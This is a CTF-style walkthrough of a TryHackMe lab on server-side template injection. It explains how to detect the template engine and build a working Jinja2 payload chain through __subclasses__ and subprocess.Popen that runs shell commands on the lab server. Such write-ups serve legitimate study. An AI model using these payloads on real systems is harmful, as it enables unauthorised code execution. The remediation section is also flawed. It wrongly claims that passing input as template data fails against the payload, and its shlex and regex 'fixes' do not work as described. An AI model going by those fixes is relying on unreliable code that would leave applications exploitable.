
# INTRO:


This walkthrough is based on the walkthrough 
provided in THM => tryhackme.com/room/learnssti
and tries to explain things in a more detailed manner

> What is SSTI (Server Side Template Injection)
---> 
A type of web injection type. it exploits a badly managed code 
related to template engins running @ the back-end side of an app.


> What are template engins ?
--->
A template engine is a specific kind of template processing module
that exhibits all of the major features of a modern programming language.


> known template frameworks :
---->
smarty + twig ---> php based template engies
jinja2 + mako ---> python based template engies


Flask & Jinja code snippet example

```
   from flask import Flask, render_template_string
   app = Flask(__name__)

   @app.route("/profile/<user>")
   def profile_page(user):
       template = f"<h1>Welcome to the profile of {user}!</h1>"

       return render_template_string(template)

   app.run()
```
        





# Detection :

most of template engines use special characters such
as these  ${{<%[%'"}}%  to define types of templates

To understand more about the characters used i recommend 
to view the documentation of each template engine you are
dealing with in your pentesting.

> NOTE - to learn more about the syntax of templates in such
frameworks follow the documentation links in the syntax section




since this walkthrough is based on the  machines provied in
this THM lab we already know jinja frameworks is being used 

To start detecting error automaticly you would initiate fuzzing via 
tools like wfuzz / ffuz with special characters / wordlists containing 
such characters mentioned before hoping until an error acheived.

> Note - think of it like error sqli or htmli before xss detection 
> Note - sometimes if you are lucky you would get a detailed error explaining
   	 what termplate engine (and version) is used in the back-end
> Note - there are prepared fuzzing wordlists/tools in kali & github.

	> ssti payload wordlist
	---->
	https://github.com/payloadbox/ssti-payloads
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
	










# Identification :

Now as mentioned in the second note in the detection section
fully detailed errors are very rare & inorder to detect what
kind of template engine is being used in the back-end you 
could perform a series of SSTI payloads to acheive this.

> to do so look at the file : "template engine desicion tee.jpg"

follow the payload tree on the lab provided in the ssti room in THM.
https://tryhackme.com/room/learnssti

and run try to run each payload in the jpeg file. note that the
green arrow means the math in the payload template was interpeted 
by the engine while red arrow means the payload returns as is.



> Note that when using the decision tree photo to decide
  on which template framework is being used in the labs
  provided in the THM ssti room we reach a split in the road.
  
> we can either understand its the 'jinja' OR 'twig' framework
  in this case we can decide which one is being used by the
  the programming language the framework is based upon.
  

Notes

after following the decision tree we finished with
the results we are either dealing with twig or jinja2


in order to understand the used framework
jinja2 is based on python 
twig is based on php

this means that the next template --> {{7 * '7'}}
in jinja2 (python based) the injection will return ---> 7777777
in twig (php based) the injection will return ---> 49

> this happens because eventually the template payload is
  evaluated by the interpeter / compiler of the programming 
  language before the framework does template parsing...











# Syntax :

> Jinja template documentation
https://jinja.palletsprojects.com/en/2.11.x/api/#jinja2.Environment

{{ }} 	===> variable template ===> 
The strings marking the beginning/end of an print statement.

{% %} 	===> block template ===> 
The string marking the beginning/end of a (code) block.

{# #} 	===> comment template ===>
The strings marking the beginning/ending of a comment



> special templates & template inheritance & nesting
https://jinja.palletsprojects.com/en/2.11.x/templates/#line-statements



> NOTE - both variable & block templates evaluate python code
  	 in the case of jinja templae engine framework. 
> NOTE - Block codes can have their own scope & has unique code syntax
	 which is diffrent than pythons but can evaluate some [this will
	 help later in the exploitation section].

> more about block statments in jinja
https://documentation.bloomreach.com/engagement/docs/jinjablocks











# Exploitation :


As every adversary the most wanted thing to achieve by a vulnerability
eventually is Remote Code Execution. since were using jinja (python based
template framework) we need to know python OS command execution methods. 


            
> Method 1
import os
os.system("whoami")

> Method 2
import os
os.popen("whoami").read()

> Method 3
import subprocess
subprocess.Popen("whoami", shell=True, stdout=-1).communicate()



CTF POC :
  
> Method 1
http://MACHINE_IP:5000/profile/{% import os ; os.system("whoami") }}

> Method 2
http://MACHINE_IP:5000/profile/{% import os %}{{ os.system("whoami") }}

Note: Jinja2 is essentially a sub language of Python that doesn't integrate the import statement, which is why the above does not work. (From THM)

Note: the only type of import keywords found in jinja were import/include
      but it will only work on template/macros files (.j2) 
      
      
> Method 3  
http://MACHINE_IP:5000/profile/{{ ''.__class__ }}.
===> self.__class__ is a reference to the type of the current instance.
===> refrence: https://stackoverflow.com/questions/20599375/what-is-the-purpose-of-checking-self-class
===> this payload return the following response:
     Welcome to the profile of <class 'str'>! 
     since '' is a string



http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__ }}
===> Explanation 1:
---> The self.__mro__ attribute returns a tuple, but the mro() method returns a     
     python list. When we search for the mro in a class that is involved in 
     python multiple inheritance, an order is followed. First, it is searched in  
     the current class. If not found, the search moves to parent classes.
---> refrence: https://data-flair.training/blogs/python-multiple-inheritance/

===> Explanation 2:
---> mro() stands for Method Resolution Order. It returns a list of types the class 
     is derived from, in the order they are searched for methods. mro() and __mro__
     work only on new style classes. In Python 3, they work without any issues. In
     Python 2, however, those classes need to inherit from object.
---> refrence: https://stackoverflow.com/questions/2010692/what-does-mro-do


===> this payload return the following response:
     Welcome to the profile of (<class 'str'>, <class 'object'>)!




http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1] }}
===> since we get from __mro__ / mro() either a list or a tuple we can 
     which item from those we want & since most of the choose things in 
     python are objects/classes it will help with the next payload.
===> this payload return the following response:
     Welcome to the profile of <class 'object'>!


http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}
===> __subclasses__ method returns the subclasses of the class.
     subclasses are the classes inhereting
===> refrence: https://pybit.es/articles/python-subclasses/
===> this payload returns ALL of the subclass that the <class 'object'> is 
     being inherited into and since most things in python are objects it means
     i can basicly see the list of all classes in the python file loaded/executed
     in memory !!! this will help with especially with the next payload...


http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}
===> [401] from the list mentioned before is the popen function belonging
     to the subprocess library/class. this function allows us to execute
     OS commands meaning in other words WE GOT RCE BAABBYYY!!!
===> refrence: https://www.geeksforgeeks.org/python-subprocess-module/
===> this payload response will return:
     Welcome to the profile of <class 'subprocess.Popen'>!
>    NOTE that calling a refrenced method/class via accessing its name
     via the __class__ / __mro__ / __subclasses__ keywords will execute it


http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
===> lets breakdown the last componenets needed for this to work. if
     any of the last components (after [401]) will be missing the 
===> refrence : https://stackoverflow.com/questions/3172470/actual-meaning-of-shell-true-in-subprocess

     refrence : https://github.com/python/cpython/blob/main/Lib/subprocess.py
        # Input and output objects. The general principle is like
        # this:
        #
        # Parent                   Child
        # ------                   -----
        # p2cwrite   ---stdin--->  p2cread    
        # c2pread    <--stdout---  c2pwrite
        # errread    <--stderr---  errwrite
        #
        # On POSIX, the child objects are file descriptors.  On
        # Windows, these are Windows file handles.  The parent objects
        # are file descriptors on both platforms.  The parent objects
        # are -1 when not using PIPEs. The child objects are -1
        # when not redirecting.
        
        
 	# p2c --> parent to child
 	# c2p ---> child to parent
        
     refrence : https://www.techtarget.com/whatis/definition/pipe
     A pipe simply refers to a temporary software connection between two programs or commands.
     
     refrence : https://www.simplilearn.com/tutorials/python-tutorial/subprocess-in-python
     
===> refer to links in refrences above for further detail/better explanations
     > "whoami" ---> OS command passed as a string
     > shell=True ---> Means the command will run on what the $SHELL is set to
     		     & will have to obligate the rules of the binary set in $SHELL
     		     in windows systems, it just means cmd.exe so it just sucks 
     		     youll have to follow the shell syntax requirments such
     		     as indentations, escaping, etc. (POSIX Rules)
     > stdout=-1 ---> as mentioned in the open-source code of the popen function from 
     		    the subprocess library when strout is set to -1 it means the stdout
     		    of the command running on a shell will be redirected to the parent  
     		    process file handels which in this case is the web app and back to us
     		    since this is the job of the webserver interacting with the flask code

		    stdout can be set to either a subprocess.PIPE (look at refrences)/file
		    
     > .communicate() ---> is the primary call that reads all the process's inputs and
                           outputs. without it the payload respons will only return the 
                           object memory address location instead of the errors\output...


===> the payload response is 
     Welcome to the profile of (b'jake', None)!
















# Remediation :

```
Insecure: Concatenating input
template = f"<h1>Welcome to the profile of {user}!</h1>"
return render_template_string(template)
```
```
# Secure: Passing input as data
template = "<h1>Welcome to the profile of {{ user }}!</h1>"
return render_template_string(template, user=user)
```

1st Payload :
=================
/profile/{7*7}

Both snippets produce the same output for the given payload. However, snippet 2 is considered more secure because it uses double curly braces {{ }} around the user variable in the template.

This helps to prevent potential template injection attacks by escaping any potentially malicious code. a

In snippet 1, if the user variable was controlled by a malicious user, they could potentially inject malicious code into the template. Therefore, snippet 2 is the safer option.





2nd Payload :
=================
/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}

Even with the double curly braces, the payload could still potentially execute because the double curly braces are meant for rendering variables, not for protecting against all forms of code execution.

It's important to note that template escaping (using double curly braces) is designed to prevent HTML/JavaScript injection as such :
<script>alert('malicious code')</script>

not to defend against arbitrary code execution in the server. For protecting against arbitrary code execution, you would need additional security measures, such as input validation and sanitization, as well as proper handling of user inputs that could potentially execute code.






For example, you could use a library like shlex to properly handle user input that might contain shell commands.
```
import shlex

@app.route("/profile/<user>")
def profile_page(user):
    user_input = shlex.quote(user)  # Quote the user input to make it safe for shell execution
    command = f"echo Welcome to the profile of {user_input}!"
    template = f"<h1>{command}</h1>"
    return render_template_string(template, user=user)
```

now lets see what happens to the RCE payload after it is passed to 
the shlex.quote() sanitization funcion :
```
profile/{{ ''.__class__.__mro__[1].__subclasses__()[401](\"whoami\", shell=True, stdout=-1).communicate() }}
```

====> payload response (after sanitization)
----> Not Found 
      The requested URL was not found on the server. 
	   # NOTE : not 404 just a custom path error made by the THM lab



> another defence mechanism (regex)
```      
import re

# Remove everything that isn't alphanumeric
user = re.sub("^[A-Za-z0-9]", "", user)
template = "<h1>Welcome to the profile of {{ user }}!</h1>"
return render_template_string(template, user=user)   
```


it escapes the OS command in this case whoami
The command will be treated as a string and won't execute arbitrary code. Keep in mind that this is a simulated example for educational purposes, and in real-world scenarios, you should always implement additional security measures to ensure the safety of your application. 









Approach on SSTI Prevention :
=================================

1. Context Awareness: It's important to be aware of the context in which user input is being used. Different contexts may require different security measures. For example, user input used in a shell command requires different handling compared to user input used in a web page template.
2. Whitelist Allowed Inputs: If possible, consider using a whitelist approach. Only allow specific inputs or patterns that are known to be safe.
3. Rate Limiting: Implement rate limiting to prevent abuse of potentially dangerous operations.
4. Regular Security Audits and Code Reviews: Regularly review your codebase for potential security issues and vulnerabilities.
5. Stay Informed: Stay updated on security best practices and be aware of any new vulnerabilities or bypass techniques that may arise.
6. Security Libraries and Tools: Utilize well-established security libraries and tools that can help handle user input safely.
7. Input Validation: Validate user input on the server side to ensure it conforms to expected formats and constraints.
8. WAF (Web Application Firewall): Consider using a WAF to provide an additional layer of protection against various types of attacks.

Remember that security is a multifaceted concern and should be approached with a layered defense strategy. It's important to keep up with the latest security practices and be aware of emerging threats.



More about filtering bypass will be in the More section
in the advanced SSTI guide (gitlab)	









# MORE :


> advanced SSTI guide :
---->
https://0x1.gitlab.io/web-security/Server-Side-Template-Injection/#basic-injection

it will include :
1) automated tools
2) payloads examples (divided by template framework)
3) multiple aproaches (divided by template framework)
4) mitigation & bypass


> more refrences : ---->
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti

> Uber SSTI attack report ---->
https://hackerone.com/reports/125980

